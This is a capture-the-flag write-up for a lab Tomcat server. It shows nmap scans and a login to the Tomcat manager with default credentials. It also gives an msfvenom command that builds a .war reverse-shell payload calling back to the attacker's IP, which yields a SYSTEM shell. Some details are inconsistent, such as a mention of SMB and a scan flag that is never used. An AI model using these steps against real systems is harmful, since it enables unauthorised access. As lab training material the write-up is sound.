### Recon

Started with NMAP Scan to discover open ports

```bash
sudo nmap -T5 -sS -n -Pn --disable-arp-ping -p- 10.10.10.95 --max-retries 0 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 08:43 EDT
Warning: 10.10.10.95 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.95
Host is up (0.093s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 88.83 seconds
```

To further identify the SMB version running and possibly determine the OS, I ran a targeted Nmap Aggressive scan:

```bash
sudo nmap -A -n -Pn --disable-arp-ping --stats-every=5s -p 8080 10.10.10.95 --max-retries 0
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

```

A service named “Apache Tomcat” running on the port 8080. The http-open-proxy script indicates that the server might be misconfigured as an open proxy.

### Nmap Flags:

- **`sS`**: Performs a SYN scan (stealth scan).
- **`n`**: Disables DNS resolution to speed up scanning.
- **`-disable-arp-ping`**: Skips ARP ping.
- **`p`**: Scans all of the ports.
- **`A`**: Agressive Scan, which performs OS Detection, Version detection, Default script scanning
- **`--script=vuln,exploit` :** Runs NMAP default NSE vuln, exploit scripts to identify potential vulnerabilities.

NMAP was unable to determine any vulnerabilities for the service, but found some interesting paths

```bash

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder

```

### Brute-Forcing credentials

![image.png](assets/img/Jerry/image.png)

Tried accessing “Server status”, which returned a pop-up asking for credentials to access the page as shown below.

![image.png](assets/img/Jerry/image%201.png)

Brute-forced few known credentials found on [google](https://stackoverflow.com/questions/3829513/what-is-the-default-username-and-password-in-tomcat). Username:Password- admin:admin worked for logging into “Server Status”, “Manager App”,”Host Manager”

Found some interesting information on the webpage “Host Manager”

With the credentials obtained tomcat:s3cret (Username:Password), logged into “Tomcat Web Application Manager” on an another Private tab.

As the tomcat user, we can upload a .war file  to the server.

A .war (Web application Archive) file is a packaged file format used to distribute Java-based web applications. It stands for Web application resource and is essentially a compressed archive similar to a .zip file., but with a speific structure intended for deployment on a Java EE server, such as Apache Tomcat.

### Generating Payload & Obtaining a Reverse Shell

Generating .war payloads using “msfvenom”

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -Ff war -o test.war
```

Successfully uploaded the file (test.war) to the server

Accessing the file via web browser at “test” location resulted in obtaining a reverse shell.

Obtained shell has SYSTEM Privileges

The flags are located at Administrator’s Desktop
